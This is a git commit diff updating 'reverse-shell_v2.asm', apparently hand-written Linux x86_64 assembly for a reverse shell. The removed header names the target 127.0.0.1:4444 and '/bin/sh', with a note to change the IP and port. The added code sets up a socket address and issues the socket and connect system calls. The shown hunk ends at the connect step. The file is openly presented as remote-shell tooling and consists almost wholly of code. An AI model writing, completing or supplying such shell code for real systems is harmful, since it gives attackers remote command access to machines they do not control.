1efc230d0fb09feaeb84d35b5a5f08efb8957bfb
gorgoroth7 <janissetcelian@gmail.com>
2025-06-13 22:13:43 +0200

    Update reverse-shell_v2.asm

--- reverse-shell_v2.asm
+++ reverse-shell_v2.asm
@@ -1,15 +1,35 @@
-; Linux x86_64 Reverse Shell Assembly
-; Connects to 127.0.0.1:4444 (change IP and port as needed)
+BITS 64
 
-section .data
-    ip_addr     db 127,0,0,1          ; IP address 127.0.0.1
-    port        dw 0x5c11             ; Port 4444 in network byte order (0x115c little endian)
-    shell       db '/bin/sh',0
+global _start
 
-section .bss
-    sockfd      resd 1
-
-section .text
-    global _start
+segment .bss
+    struc sockaddr
+        sin_family: resw 1
+        sin_port: resw 1
+        sin_addr: resd 1
+    endstruc
+segment .rodata
+    sockaddr_struct_init:
+        istruc sockaddr
+            at sin_family, dw 0x2
+            at sin_port, dw 0x5c11
+            at sin_addr, dd 0x100007f
+        iend
+segment .text
 
 _start:
+    mov rax, 41
+    mov rdi, 0x2
+    mov rsi, 0x1
+    mov rdx, 0x6
+    syscall
+    push rax
+    jmp _connect_to_socket
+
+_connect_to_socket:
+    mov rax, 42
+    pop rdi
+    push rdi
+    mov rsi, sockaddr_struct_init
+    mov rdx, 0x10
+    syscall
